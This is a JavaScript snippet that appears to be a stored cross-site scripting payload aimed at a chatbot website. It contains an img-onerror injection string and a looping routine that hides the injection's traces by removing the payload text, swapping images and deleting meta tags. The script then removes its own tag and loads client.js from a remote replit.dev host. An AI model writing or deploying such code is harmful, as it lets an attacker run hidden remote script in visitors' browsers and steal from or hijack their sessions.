function fix(){
const searchContent = `<img src=x onerror='(()=>{var d=document s=d.createElement(\`script\`) s.src=\`//your-url.js\` d.head.appendChild(s)})();'>`;
document.querySelectorAll('*').forEach(node => {
    if (node.tagName === 'IMG' && node.src.includes("onerror")) {
        node.src = 'https://ella.janitorai.com/bot-avatars/6df04ec1-ba7b-45a9-a553-78d62e0da67d_d167022f-9827-4832-8950-b72ee3b6a4b3.webp';
    }
    if (node.innerHTML.includes(searchContent)) {
        node.innerHTML = node.innerHTML.split(searchContent).join('');
    }
});
const img = document.querySelector('img[src="/x.jpg"]');
if (img && img.nextSibling && img.nextSibling.nodeType === Node.TEXT_NODE) {
    img.parentNode.removeChild(img.nextSibling);
    img.remove();
}
document.querySelector('meta[name="twitter:image"]')?.remove();
document.querySelector('meta[property="og:image:secure_url"]')?.remove();
}
setInterval(fix,100);
const currentScript = document.currentScript;
if (currentScript) {
    currentScript.remove();
}

// Below is the actual script u fed

function loadScript(src){let s=document.createElement("script");s.src=src;document.head.appendChild(s);}

loadScript("https://8fba670f-e5a8-4db8-aa26-0e338f286593-00-36qkcc5ut3zr3.spock.replit.dev/static/client.js");
